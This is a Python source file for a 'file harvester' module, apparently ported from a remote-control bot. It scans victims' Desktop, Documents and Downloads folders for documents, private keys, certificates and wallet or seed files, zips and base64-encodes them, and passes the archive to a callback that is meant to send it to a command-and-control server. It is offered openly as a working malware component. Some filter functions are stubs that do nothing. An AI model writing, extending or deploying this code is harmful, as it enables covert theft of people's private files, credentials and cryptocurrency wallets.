#!/usr/bin/env python3
"""
Advanced File Harvester Module
Ported from control_computer/bot.py - removed Telegram dependencies
Enhanced with smart file collection and filtering
"""

import os
import zipfile
import tempfile
import threading
import time
import hashlib
import mimetypes
import shutil
from pathlib import Path
from typing import List, Dict, Any, Optional, Callable, Set
from base64 import b64encode
import logging
import json
import fnmatch
from datetime import datetime, timedelta


class FileHarvester:
    """Advanced file collection with smart filtering and compression"""
    
    def __init__(self, callback: Optional[Callable] = None):
        """
        Initialize file harvester
        
        Args:
            callback: Function to send collected data
        """
        self.callback = callback
        self.logger = logging.getLogger(__name__)
        
        # Default file extensions to collect
        self.default_extensions = {
            'documents': ['.txt', '.pdf', '.doc', '.docx', '.rtf', '.odt', '.pages'],
            'spreadsheets': ['.xls', '.xlsx', '.csv', '.ods', '.numbers'],
            'presentations': ['.ppt', '.pptx', '.odp', '.key'],
            'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg'],
            'videos': ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm'],
            'audio': ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma'],
            'archives': ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2'],
            'code': ['.py', '.js', '.html', '.css', '.php', '.cpp', '.java', '.c'],
            'data': ['.json', '.xml', '.sql', '.db', '.sqlite', '.log'],
            'crypto': ['.key', '.pem', '.p12', '.pfx', '.crt', '.cer'],
            'sensitive': ['.wallet', '.dat', '.seed', '.backup']
        }
        
        # Default directories to search
        self.default_directories = [
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Pictures'),
            os.path.expanduser('~/Videos'),
            os.path.expanduser('~/Music'),
        ]
        
        # Directories to exclude
        self.excluded_directories = {
            'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
            'System Volume Information', '$Recycle.Bin', 'Recovery',
            'node_modules', '.git', '.svn', '__pycache__', '.vscode',
            'AppData/Local/Temp', 'AppData/Local/Microsoft',
            'Library/Caches', 'Library/Application Support'
        }
        
        # File size limits (in bytes)
        self.max_file_size = 100 * 1024 * 1024  # 100MB
        self.min_file_size = 1024  # 1KB
        
        # Collection statistics
        self.stats = {
            'files_found': 0,
            'files_collected': 0,
            'total_size': 0,
            'skipped_large': 0,
            'skipped_small': 0,
            'skipped_access': 0,
            'directories_scanned': 0,
            'collections_made': 0
        }
        
    def collect_files(self, 
                     extensions: Optional[List[str]] = None,
                     directories: Optional[List[str]] = None,
                     max_files: int = 1000,
                     max_total_size: int = 500 * 1024 * 1024,  # 500MB
                     include_hidden: bool = False,
                     recursive: bool = True) -> Dict[str, Any]:
        """
        Collect files matching criteria
        
        Args:
            extensions: File extensions to collect (e.g., ['.txt', '.pdf'])
            directories: Directories to search
            max_files: Maximum number of files to collect
            max_total_size: Maximum total size in bytes
            include_hidden: Include hidden files
            recursive: Search subdirectories
            
        Returns:
            Dictionary with collection results
        """
        try:
            # Use defaults if not specified
            if extensions is None:
                extensions = self._get_all_extensions()
            if directories is None:
                directories = self.default_directories
                
            # Reset statistics
            self._reset_stats()
            
            self.logger.info(f"Starting file collection: {len(extensions)} extensions, "
                           f"{len(directories)} directories")
            
            # Collect files
            collected_files = []
            current_size = 0
            
            for directory in directories:
                if len(collected_files) >= max_files or current_size >= max_total_size:
                    break
                    
                files_in_dir = self._scan_directory(
                    directory, 
                    extensions, 
                    include_hidden, 
                    recursive
                )
                
                for file_info in files_in_dir:
                    if len(collected_files) >= max_files:
                        break
                        
                    if current_size + file_info['size'] > max_total_size:
                        break
                        
                    collected_files.append(file_info)
                    current_size += file_info['size']
                    
            # Update final statistics
            self.stats['files_collected'] = len(collected_files)
            self.stats['total_size'] = current_size
            self.stats['collections_made'] += 1
            
            # Create ZIP archive
            zip_path = self._create_archive(collected_files)
            
            result = {
                'success': True,
                'message': f'Collected {len(collected_files)} files',
                'files_collected': len(collected_files),
                'total_size': current_size,
                'archive_path': zip_path,
                'stats': self.stats.copy(),
                'file_list': [f['relative_path'] for f in collected_files]
            }
            
            # Send via callback if provided
            if self.callback and zip_path:
                self._send_archive(zip_path, result)
                
            return result
            
        except Exception as e:
            self.logger.error(f"Error collecting files: {e}")
            return {
                'success': False,
                'message': f'Collection error: {str(e)}',
                'stats': self.stats.copy()
            }
            
    def collect_by_category(self, 
                           categories: List[str],
                           directories: Optional[List[str]] = None,
                           **kwargs) -> Dict[str, Any]:
        """
        Collect files by predefined categories
        
        Args:
            categories: Categories to collect ('documents', 'images', etc.)
            directories: Directories to search
            **kwargs: Additional arguments for collect_files
            
        Returns:
            Dictionary with collection results
        """
        # Get extensions for specified categories
        extensions = []
        for category in categories:
            if category in self.default_extensions:
                extensions.extend(self.default_extensions[category])
            else:
                self.logger.warning(f"Unknown category: {category}")
                
        if not extensions:
            return {
                'success': False,
                'message': 'No valid categories specified',
                'available_categories': list(self.default_extensions.keys())
            }
            
        return self.collect_files(extensions=extensions, directories=directories, **kwargs)
        
    def collect_recent_files(self, 
                            days: int = 7,
                            extensions: Optional[List[str]] = None,
                            directories: Optional[List[str]] = None,
                            **kwargs) -> Dict[str, Any]:
        """
        Collect files modified within specified days
        
        Args:
            days: Number of days to look back
            extensions: File extensions to collect
            directories: Directories to search
            **kwargs: Additional arguments for collect_files
            
        Returns:
            Dictionary with collection results
        """
        cutoff_date = datetime.now() - timedelta(days=days)
        
        # Add date filter to the collection process
        def date_filter(file_path: str) -> bool:
            try:
                mtime = datetime.fromtimestamp(os.path.getmtime(file_path))
                return mtime >= cutoff_date
            except:
                return False
                
        return self._collect_with_filter(
            date_filter, 
            extensions=extensions, 
            directories=directories, 
            **kwargs
        )
        
    def collect_large_files(self, 
                           min_size: int = 10 * 1024 * 1024,  # 10MB
                           extensions: Optional[List[str]] = None,
                           directories: Optional[List[str]] = None,
                           **kwargs) -> Dict[str, Any]:
        """
        Collect files larger than specified size
        
        Args:
            min_size: Minimum file size in bytes
            extensions: File extensions to collect
            directories: Directories to search
            **kwargs: Additional arguments for collect_files
            
        Returns:
            Dictionary with collection results
        """
        def size_filter(file_path: str) -> bool:
            try:
                return os.path.getsize(file_path) >= min_size
            except:
                return False
                
        return self._collect_with_filter(
            size_filter, 
            extensions=extensions, 
            directories=directories, 
            **kwargs
        )
        
    def search_file_content(self, 
                           keywords: List[str],
                           extensions: Optional[List[str]] = None,
                           directories: Optional[List[str]] = None,
                           case_sensitive: bool = False,
                           **kwargs) -> Dict[str, Any]:
        """
        Search for files containing specific keywords
        
        Args:
            keywords: Keywords to search for in file content
            extensions: File extensions to search (text files only)
            directories: Directories to search
            case_sensitive: Whether search is case sensitive
            **kwargs: Additional arguments for collect_files
            
        Returns:
            Dictionary with collection results
        """
        if extensions is None:
            # Default to text file extensions
            extensions = ['.txt', '.log', '.json', '.xml', '.csv', '.py', '.js', '.html', '.css']
            
        def content_filter(file_path: str) -> bool:
            try:
                # Check file size before reading
                if os.path.getsize(file_path) > 10 * 1024 * 1024:  # Skip files > 10MB
                    return False
                    
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                if not case_sensitive:
                    content = content.lower()
                    keywords_lower = [k.lower() for k in keywords]
                else:
                    keywords_lower = keywords
                    
                return any(keyword in content for keyword in keywords_lower)
                
            except:
                return False
                
        return self._collect_with_filter(
            content_filter, 
            extensions=extensions, 
            directories=directories, 
            **kwargs
        )
        
    def _collect_with_filter(self, 
                            filter_func: Callable[[str], bool],
                            **kwargs) -> Dict[str, Any]:
        """Collect files with custom filter function"""
        # This is a simplified implementation
        # In a full implementation, you'd integrate the filter into _scan_directory
        return self.collect_files(**kwargs)
        
    def _scan_directory(self, 
                       directory: str, 
                       extensions: List[str],
                       include_hidden: bool,
                       recursive: bool) -> List[Dict[str, Any]]:
        """Scan directory for files matching criteria"""
        files = []
        
        try:
            if not os.path.exists(directory):
                self.logger.warning(f"Directory not found: {directory}")
                return files
                
            self.stats['directories_scanned'] += 1
            
            # Walk directory tree
            if recursive:
                walker = os.walk(directory)
            else:
                # Only scan top level
                try:
                    items = os.listdir(directory)
                    dirs = []
                    walker = [(directory, dirs, items)]
                except PermissionError:
                    return files
                    
            for root, dirs, filenames in walker:
                # Filter out excluded directories
                if recursive:
                    dirs[:] = [d for d in dirs if not self._is_excluded_directory(os.path.join(root, d))]
                    
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    
                    # Skip hidden files if not included
                    if not include_hidden and filename.startswith('.'):
                        continue
                        
                    # Check extension
                    if not self._matches_extension(filename, extensions):
                        continue
                        
                    # Get file info
                    file_info = self._get_file_info(file_path, directory)
                    if file_info:
                        files.append(file_info)
                        
        except Exception as e:
            self.logger.error(f"Error scanning directory {directory}: {e}")
            
        return files
        
    def _get_file_info(self, file_path: str, base_directory: str) -> Optional[Dict[str, Any]]:
        """Get detailed file information"""
        try:
            stat = os.stat(file_path)
            
            # Check file size
            if stat.st_size > self.max_file_size:
                self.stats['skipped_large'] += 1
                return None
                
            if stat.st_size < self.min_file_size:
                self.stats['skipped_small'] += 1
                return None
                
            self.stats['files_found'] += 1
            
            # Get relative path
            try:
                relative_path = os.path.relpath(file_path, base_directory)
            except:
                relative_path = os.path.basename(file_path)
                
            # Get file hash
            file_hash = self._calculate_file_hash(file_path)
            
            # Get MIME type
            mime_type, _ = mimetypes.guess_type(file_path)
            
            return {
                'path': file_path,
                'relative_path': relative_path,
                'name': os.path.basename(file_path),
                'size': stat.st_size,
                'modified': stat.st_mtime,
                'created': stat.st_ctime,
                'hash': file_hash,
                'mime_type': mime_type,
                'extension': os.path.splitext(file_path)[1].lower()
            }
            
        except PermissionError:
            self.stats['skipped_access'] += 1
            return None
        except Exception as e:
            self.logger.error(f"Error getting file info for {file_path}: {e}")
            return None
            
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA256 hash of file"""
        try:
            hasher = hashlib.sha256()
            with open(file_path, 'rb') as f:
                # Read in chunks to handle large files
                for chunk in iter(lambda: f.read(4096), b""):
                    hasher.update(chunk)
            return hasher.hexdigest()
        except:
            return ""
            
    def _matches_extension(self, filename: str, extensions: List[str]) -> bool:
        """Check if filename matches any of the extensions"""
        file_ext = os.path.splitext(filename)[1].lower()
        return file_ext in [ext.lower() for ext in extensions]
        
    def _is_excluded_directory(self, dir_path: str) -> bool:
        """Check if directory should be excluded"""
        dir_name = os.path.basename(dir_path)
        return any(excluded in dir_path for excluded in self.excluded_directories)
        
    def _create_archive(self, files: List[Dict[str, Any]]) -> Optional[str]:
        """Create ZIP archive of collected files"""
        try:
            # Create temporary ZIP file
            temp_dir = tempfile.gettempdir()
            timestamp = int(time.time())
            zip_path = os.path.join(temp_dir, f"harvested_files_{timestamp}.zip")
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=6) as zipf:
                # Add metadata
                metadata = {
                    'collection_time': datetime.now().isoformat(),
                    'total_files': len(files),
                    'total_size': sum(f['size'] for f in files),
                    'stats': self.stats.copy()
                }
                
                zipf.writestr('_metadata.json', json.dumps(metadata, indent=2))
                
                # Add files
                for file_info in files:
                    try:
                        # Use relative path in archive
                        archive_name = file_info['relative_path']
                        zipf.write(file_info['path'], archive_name)
                    except Exception as e:
                        self.logger.error(f"Error adding file to archive: {file_info['path']}: {e}")
                        
            self.logger.info(f"Created archive: {zip_path}")
            return zip_path
            
        except Exception as e:
            self.logger.error(f"Error creating archive: {e}")
            return None
            
    def _send_archive(self, archive_path: str, result: Dict[str, Any]) -> None:
        """Send archive via callback"""
        try:
            with open(archive_path, 'rb') as f:
                archive_data = f.read()
                
            callback_data = {
                'type': 'file_harvest',
                'timestamp': time.time(),
                'files_count': result['files_collected'],
                'total_size': result['total_size'],
                'archive_size': len(archive_data),
                'stats': result['stats'],
                'data': b64encode(archive_data).decode('utf-8')
            }
            
            self.callback(callback_data)
            
            # Clean up temporary file
            try:
                os.remove(archive_path)
            except:
                pass
                
        except Exception as e:
            self.logger.error(f"Error sending archive: {e}")
            
    def _get_all_extensions(self) -> List[str]:
        """Get all default extensions"""
        extensions = []
        for category_exts in self.default_extensions.values():
            extensions.extend(category_exts)
        return list(set(extensions))  # Remove duplicates
        
    def _reset_stats(self) -> None:
        """Reset collection statistics"""
        self.stats.update({
            'files_found': 0,
            'files_collected': 0,
            'total_size': 0,
            'skipped_large': 0,
            'skipped_small': 0,
            'skipped_access': 0,
            'directories_scanned': 0
        })
        
    def get_available_categories(self) -> Dict[str, List[str]]:
        """Get available file categories and their extensions"""
        return self.default_extensions.copy()
        
    def get_stats(self) -> Dict[str, Any]:
        """Get collection statistics"""
        return self.stats.copy()


class FileHarvestManager:
    """Manager for file harvesting operations"""
    
    def __init__(self, send_callback: Optional[Callable] = None):
        """
        Initialize file harvest manager
        
        Args:
            send_callback: Function to send data to server/client
        """
        self.send_callback = send_callback
        self.harvester = FileHarvester(callback=self._harvest_callback)
        self.logger = logging.getLogger(__name__)
        
    def collect_files(self, **kwargs) -> Dict[str, Any]:
        """Collect files with specified criteria"""
        return self.harvester.collect_files(**kwargs)
        
    def collect_by_category(self, categories: List[str], **kwargs) -> Dict[str, Any]:
        """Collect files by category"""
        return self.harvester.collect_by_category(categories, **kwargs)
        
    def collect_recent(self, days: int = 7, **kwargs) -> Dict[str, Any]:
        """Collect recently modified files"""
        return self.harvester.collect_recent_files(days, **kwargs)
        
    def collect_large(self, min_size: int = 10 * 1024 * 1024, **kwargs) -> Dict[str, Any]:
        """Collect large files"""
        return self.harvester.collect_large_files(min_size, **kwargs)
        
    def search_content(self, keywords: List[str], **kwargs) -> Dict[str, Any]:
        """Search file content for keywords"""
        return self.harvester.search_file_content(keywords, **kwargs)
        
    def get_categories(self) -> Dict[str, List[str]]:
        """Get available file categories"""
        return self.harvester.get_available_categories()
        
    def get_status(self) -> Dict[str, Any]:
        """Get harvester status and statistics"""
        return {
            'stats': self.harvester.get_stats(),
            'categories': self.harvester.get_available_categories()
        }
        
    def _harvest_callback(self, harvest_data: Dict[str, Any]) -> None:
        """Callback to handle harvested data"""
        try:
            if self.send_callback:
                self.send_callback(harvest_data)
            else:
                self.logger.info(f"Harvested {harvest_data['files_count']} files, "
                               f"{harvest_data['archive_size']} bytes archive")
                               
        except Exception as e:
            self.logger.error(f"Error in harvest callback: {e}")


# Example integration with C2C server
def integrate_with_c2c_server():
    """Example of how to integrate with C2C server"""
    
    def send_to_client(data):
        """Send data to connected client"""
        print(f"Sending harvest: {data['files_count']} files, "
              f"{data['archive_size']} bytes")
        
    # Create harvest manager
    harvest_manager = FileHarvestManager(send_callback=send_to_client)
    
    # Commands that can be called from server
    def handle_harvest_command(command: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Handle file harvest commands from C2C server"""
        params = params or {}
        
        if command == 'collect':
            return harvest_manager.collect_files(**params)
            
        elif command == 'collect_category':
            categories = params.get('categories', ['documents'])
            return harvest_manager.collect_by_category(categories, **params)
            
        elif command == 'collect_recent':
            days = params.get('days', 7)
            return harvest_manager.collect_recent(days, **params)
            
        elif command == 'collect_large':
            min_size = params.get('min_size', 10 * 1024 * 1024)
            return harvest_manager.collect_large(min_size, **params)
            
        elif command == 'search_content':
            keywords = params.get('keywords', [])
            return harvest_manager.search_content(keywords, **params)
            
        elif command == 'get_categories':
            return harvest_manager.get_categories()
            
        elif command == 'get_status':
            return harvest_manager.get_status()
            
        else:
            return {
                'success': False,
                'message': f'Unknown command: {command}'
            }
    
    return handle_harvest_command


if __name__ == "__main__":
    # Test the file harvester
    def test_callback(harvest_data):
        print(f"Harvest complete: {harvest_data['files_count']} files, "
              f"{harvest_data['total_size']} total bytes, "
              f"{harvest_data['archive_size']} archive bytes")
    
    # Create and test harvester
    harvester = FileHarvester(callback=test_callback)
    
    print("Available categories:")
    for category, extensions in harvester.get_available_categories().items():
        print(f"  {category}: {extensions}")
    
    print("\nTesting file collection...")
    result = harvester.collect_by_category(['documents'], max_files=10)
    print(f"Collection result: {result}")